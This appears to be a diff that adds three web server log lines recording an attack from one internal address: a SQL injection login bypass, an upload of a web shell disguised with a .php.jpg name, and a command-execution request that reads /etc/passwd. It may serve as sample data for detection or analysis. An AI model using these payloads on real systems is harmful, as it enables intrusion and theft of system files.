@@ -1,0 +1,3 @@
+[19/May/2026:22:15:01] 192.168.1.45 GET /login.php?user=admin' OR '1'='1 -- &pass=1234
+[19/May/2026:22:15:02] 192.168.1.45 POST /upload.php [File: webshell.php.jpg]
+[19/May/2026:22:15:05] 192.168.1.45 GET /cmd.php?cmd=cat /etc/passwd
